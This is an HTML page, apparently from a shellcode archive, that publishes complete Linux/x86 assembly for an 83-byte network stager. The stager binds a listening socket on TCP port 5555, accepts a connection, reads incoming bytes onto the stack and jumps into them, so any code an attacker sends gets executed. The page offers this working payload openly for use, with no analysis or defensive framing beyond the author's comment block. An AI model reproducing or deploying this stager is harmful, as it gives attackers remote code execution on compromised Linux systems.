<html><head><title>Linux/x86 - listens for shellcode on tcp/5555 and jumps to it - 83 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
    _  __                 __  ___      __       
   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
   |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / 
 /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/  

 xenomuta\x40phreaker\x2enet
 http://xenomuta.tuxfamily.org/ - Methylxantina 256mg

 Description: 
 linux/x86 listens for shellcode on tcp/5555 and jumps to it
 OS: Linux
 Arch: x86
 Length: 83 bytes
 Author: XenoMuta

 greetz to: 
  str0k3 (tnx for your effort), emra (fragancia),
  fr1t0l4y (dejate ver), garay (no me olvido de los pobres ;p )
  - God bless you all -
*/
.global _start

_start:
	xor %ebx, %ebx
	mov %ebx, %eax

_socket:
	push $0x6
	push $0x1
	push $0x2
	mov $0x66, %al	
	incb %bl
	mov %esp, %ecx
	int $0x80

_bind:
	mov %eax, %edi
	xor %edx, %edx
	push %edx
	pushw $0xb315	/* 5555 */
	pushw %bx
	mov %esp, %ecx
	push $0x10
	push %ecx
	push %edi
	mov $0x66, %al
	incb %bl
	mov %esp, %ecx
	int $0x80

_listen:
	incb %bl
	push $0x1
	push %edi
	mov $0x66, %al
	incb %bl
	mov %esp, %ecx
	int $0x80

_accept:
	push %edx
	push %edx
	push %edi
	mov $0x66, %al
	incb %bl
	mov %esp, %ecx
	int $0x80
	mov %eax, %ebx

_read:
	mov $0x3, %al
	mov %esp, %ecx
	mov $0x7ff, %dx
	incb %dl
	int $0x80
	jmp *%ecx	/* Jump to our shellcode */



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
